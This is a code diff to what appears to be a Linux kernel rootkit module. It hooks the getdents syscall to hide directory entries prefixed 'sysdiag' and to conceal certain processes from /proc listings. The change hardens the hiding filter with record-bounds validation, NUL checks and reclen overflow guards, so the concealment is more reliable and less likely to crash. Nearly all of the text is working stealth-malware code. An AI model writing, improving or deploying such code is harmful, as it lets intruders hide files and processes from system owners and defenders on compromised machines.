@@ -3,6 +3,8 @@
 
 #include <linux/dirent.h>
 #include <linux/pid.h>
+#include <linux/stddef.h>
+
 /* 3.10 headers do not export struct linux_dirent (private to fs/readdir.c) */
 struct linux_dirent {
     unsigned long  d_ino;
@@ -11,8 +13,9 @@ struct linux_dirent {
     char           d_name[];
 };
 
-#define PREFIX "sysdiag"    
-#define MARKER "sysdiag"    
+#define PREFIX "sysdiag"
+#define MARKER "sysdiag"
+
 static asmlinkage long (*og_getdents)(unsigned int fd,
         struct linux_dirent __user *dirent, unsigned int count);
 
@@ -26,7 +29,6 @@ static bool is_numeric(const char *s)
             return false;
     return true;
 }
-
 
 static long filter_dirents(void __user *udirent, long ret, bool is64)
 {
@@ -47,23 +49,48 @@ static long filter_dirents(void __user *udirent, long ret, bool is64)
         struct linux_dirent   *d32;
         char *name;
         unsigned short reclen;
+        unsigned long remaining = (unsigned long)(ret - off);
+        size_t hdr;                    /* bytes before d_name */
         bool hide = false;
 
         cur = kbuf + off;
 
+        /* --- header validation BEFORE reading any record field --- */
         if (is64) {
+            hdr = offsetof(struct linux_dirent64, d_name);   /* 19 */
+            if (remaining < hdr + 1) {
+                kfree(kbuf);
+                return -EINVAL;
+            }
             d64    = (struct linux_dirent64 *)cur;
-            name   = d64->d_name;
             reclen = d64->d_reclen;
         } else {
+            hdr = offsetof(struct linux_dirent, d_name);     /* 18 */
+            if (remaining < hdr + 1) {
+                kfree(kbuf);
+                return -EINVAL;
+            }
             d32    = (struct linux_dirent *)cur;
-            name   = d32->d_name;
             reclen = d32->d_reclen;
         }
 
+        /* --- record bounds validation --- */
+        if (reclen < hdr + 1 || reclen > remaining) {
+            kfree(kbuf);
+            return -EINVAL;
+        }
+
+        /* --- bounded NUL check inside the record --- */
+        name = cur + hdr;
+        if (!memchr(name, '\0', reclen - hdr)) {
+            kfree(kbuf);
+            return -EINVAL;
+        }
+
+        /* --- hide decision --- */
         if (strncmp(name, PREFIX, strlen(PREFIX)) == 0) {
-            hide = true;                        /* rule 1: name prefix */
-                } else if (is_numeric(name)) {          /* rule 2: /proc/<pid> */
+            hide = true;
+        } else if (is_numeric(name)) {
             int pid;
             if (kstrtoint(name, 10, &pid) == 0) {
                 struct pid *p = find_get_pid(pid);
@@ -79,24 +106,36 @@ static long filter_dirents(void __user *udirent, long ret, bool is64)
             }
         }
 
+        /* --- hide / slide / extend (with 16-bit overflow guard) --- */
         if (hide) {
             if (cur == kbuf) {
                 ret -= reclen;
                 memmove(cur, cur + reclen, ret);
                 continue;
             }
-            if (is64)
+            if (is64) {
+                if ((unsigned long)((struct linux_dirent64 *)prev)->d_reclen +
+                    reclen > 0xFFFF) {
+                    kfree(kbuf);
+                    return -EINVAL;
+                }
                 ((struct linux_dirent64 *)prev)->d_reclen += reclen;
-            else
+            } else {
+                if ((unsigned long)((struct linux_dirent *)prev)->d_reclen +
+                    reclen > 0xFFFF) {
+                    kfree(kbuf);
+                    return -EINVAL;
+                }
                 ((struct linux_dirent *)prev)->d_reclen += reclen;
+            }
         } else {
-            prev = cur;  
+            prev = cur;
         }
 
         off += reclen;
     }
 
-        if (copy_to_user(udirent, kbuf, ret))
+    if (copy_to_user(udirent, kbuf, ret))
         ret = -EFAULT;
     kfree(kbuf);
     return ret;
